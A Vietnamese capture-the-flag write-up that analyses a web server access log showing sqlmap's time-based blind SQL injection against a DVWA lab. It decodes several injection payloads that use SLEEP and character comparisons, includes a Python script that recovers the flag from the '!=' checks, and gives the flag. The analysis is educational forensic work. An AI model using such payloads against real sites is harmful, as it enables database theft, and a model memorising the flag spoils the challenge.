# Write Up

Đề bài cho 1 file `access.log`

Khi đọc thì chúng ta sẽ thấy đây thuộc dạng `Blind SQLi`

Thử phân tích 1 vài dòng

```txt
172.20.0.1 - - [26/Apr/2024:17:52:29 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%207724%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28id%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E1%29%2CSLEEP%281%29%2C7724%29--%20nhXl&Submit=Submit HTTP/1.1" 200 1798 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
```

Khi làm rõ ra nó sẽ trông như này

```sql
id=1' AND 7724=IF(
  (ORD(MID(
    (SELECT IFNULL(CAST(id AS CHAR), 0x20) 
     FROM dvwa.flag 
     ORDER BY id 
     LIMIT 0,1),
  2,1)) > 1),
  SLEEP(1),
  7724
)-- nhXl
```

Phân tích 

```txt
| Thành phần                              | Ý nghĩa                                                                              |
| --------------------------------------- | ------------------------------------------------------------------------------------ |
| `id=1'`                                 | Chấm dứt phần giá trị `id=` ban đầu                                                  |
| `AND 7724=IF(...)`                      | Bắt đầu điều kiện so sánh, dùng để tạo phản hồi khác biệt nếu điều kiện đúng         |
| `SELECT IFNULL(CAST(id AS CHAR), 0x20)` | Lấy cột `id` trong bảng `dvwa.flag`, ép kiểu về chuỗi, thay `NULL` bằng khoảng trắng |
| `ORDER BY id LIMIT 0,1`                 | Lấy dòng đầu tiên của bảng `dvwa.flag`                                               |
| `MID(...,2,1)`                          | Lấy **ký tự thứ 2** trong chuỗi                                                      |
| `ORD(...) > 1`                          | Kiểm tra nếu mã ASCII của ký tự > 1                                                  |
| `SLEEP(1)`                              | Nếu đúng thì server **ngủ 1 giây** (tạo delay)                                       |
| `7724`                                  | Nếu sai thì trả về 7724 để khớp với điều kiện ngoài                                  |
| `-- nhXl`                               | Comment phần còn lại của truy vấn SQL gốc để tránh lỗi cú pháp                       |
```

Mục đích là để tấn công kiểu Blind Time-based SQLi bằng cách sử dụng SLEEP(1)

Anh em cứ mò ở những cái khoảng mà nó không cách nhau quá 1 giây, vì khi điều kiện sai

```txt
172.20.0.1 - - [26/Apr/2024:17:50:54 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1664 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
```

Làm rõ

```sql
id=1' AND 9329=IF(
  (ORD(MID((
    SELECT IFNULL(CAST(`value` AS CHAR), 0x20)
    FROM dvwa.flag
    ORDER BY id
    LIMIT 0,1), 1,1)) > 64),
  SLEEP(1),
  9329
)-- QEcW
```

Đây là đoạn SQL tôi ví dụ cho anh em

Còn đoạn liên tục trông nó như này

```txt
172.20.0.1 - - [26/Apr/2024:17:50:57 +0000] "GET /vulnerabilities/sqli/?id=1%27%20AND%209329%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20id%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D68%29%2CSLEEP%281%29%2C9329%29--%20QEcW&Submit=Submit HTTP/1.1" 200 1806 "-"
```

Làm rõ

```sql
id=1' AND 9329=IF(
  (ORD(MID((
    SELECT IFNULL(CAST(`value` AS CHAR), 0x20)
    FROM dvwa.flag
    ORDER BY id
    LIMIT 0,1
  ),1,1)) != 68),
  SLEEP(1),
  9329
)-- QEcW
```

Khi kiểm tra thấy điều kiện là `!= 68` mà nó đúng thì sẽ không gọi SLEEP(1) tức là thời gian sẽ không bị chênh nhau 1 giây

Vậy những đoạn kiểm tra `!=` sẽ là những điều kiện sai, tức là nó chính là ký tự trong flag

Anh em chỉ cần tìm ra những đoạn `!=` rồi giải mã là xong

Script

```python
import re
import urllib.parse

def extract_not_equal_numbers(log_path):
    result = []

    # Mã hóa URL của ký tự "!=" là "%21%3D"
    not_equal_encoded = '%21%3D'

    with open(log_path, 'r', encoding='utf-8') as file:
        for line in file:
            # Chỉ xét các dòng chứa từ "flag" và có chứa dấu "!=" (mã hóa)
            if 'flag' in line and not_equal_encoded in line:
                # Giải mã URL để dễ tìm dấu != và số sau đó
                decoded_line = urllib.parse.unquote(line)

                # Tìm biểu thức kiểu: !=<số>
                matches = re.findall(r'!=\s*(\d+)', decoded_line)
                result.extend(matches)

    return result

# Ví dụ sử dụng
if __name__ == "__main__":
    path_to_log = "access.log"
    extracted_numbers = extract_not_equal_numbers(path_to_log)

    print("Các số xuất hiện ngay sau '!=' trong dòng có 'flag':")
    for num in extracted_numbers:
        print(num)
```

Flag: DH{anA1yz1nGVe3yB19L0g}
